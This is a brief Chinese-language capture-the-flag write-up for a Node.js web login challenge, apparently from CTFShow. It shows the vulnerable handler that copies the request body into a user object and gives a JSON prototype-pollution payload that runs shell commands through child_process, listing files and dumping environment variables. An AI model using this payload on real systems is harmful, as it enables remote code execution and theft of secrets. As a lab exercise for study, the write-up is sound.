- # 题解
	- `/login`
	- ```js
	  res.type('html');
	  var flag='flag_here';
	  var user = new function(){
	    this.userinfo = new function(){
	      this.isVIP = false;
	      this.isAdmin = false;
	      this.isAuthor = false;
	    };
	  }
	  utils.copy(user.userinfo,req.body);
	  if(user.userinfo.isAdmin){
	    res.end(flag);
	  }else{
	    return res.json({ret_code: 2, ret_msg: '登录失败'});  
	  }
	  ```
	- 第十行存在原型链污染，但是`isAdmin`参数已经设置，无法直接污染第十一行
	- 基本思路和 [[CTF/WP/CTFShow/web339]]相同
	- Payload:
	- ```json
	  {"username":"a","password":"1","__proto__": {"__proto__":{"query":"return (() =>{try {return global.process.mainModule.constructor._load('child_process').execSync('echo $(ls .) $(env)').toString();}catch(e){return e;}})();"}}}
	  ```